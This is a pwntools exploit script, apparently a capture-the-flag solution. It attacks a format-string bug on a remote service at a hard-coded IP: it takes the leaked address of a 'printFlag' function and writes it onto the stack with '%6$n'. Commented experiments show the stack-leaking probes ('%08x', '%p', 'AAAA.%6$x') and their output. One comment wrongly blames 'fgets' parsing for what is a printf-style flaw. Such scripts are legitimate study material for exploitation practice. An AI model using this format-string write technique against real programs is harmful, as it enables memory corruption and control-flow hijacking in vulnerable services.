from pwn import *

import sys;
import numpy;
import io;

pwnlib.context.log_level = 'debug'

r = remote('54.89.22.85', 10004)

# Receive the address of the printFlag fn
addr = r.recv(10)

# Convert address to chars that we can send back over the wire
iaddr = int(addr, 0)
paddr = pack(iaddr, 32)

# Abuse fgets format parsing to write a new address to the stack
r.send(paddr)
r.sendline('%6$n')
r.interactive()



# EXPERIMENTS:

# r.sendline('%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x')
# 000000c8.f77035a0.f77072b8.00000000.00000000.78383025.3830252e.30252e78.252e7838.2e783830

# r.sendline('%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
# 0xc8.0xf77c65a0.0xf77ca2b8.(nil).(nil).0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70

# Write AAAA (hex 41414141) to the stack
# r.sendline('AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x')
# AAAA.c8.f77335a0.f77372b8.0.0.41414141.2e78252e.252e7825.78252e78

# Read value from 6th address
# r.sendline('AAAA.%6$x')
# AAAA.41414141

# Write value to second address
# r.sendline('AAAA%2$n')
# AAAA.41414141

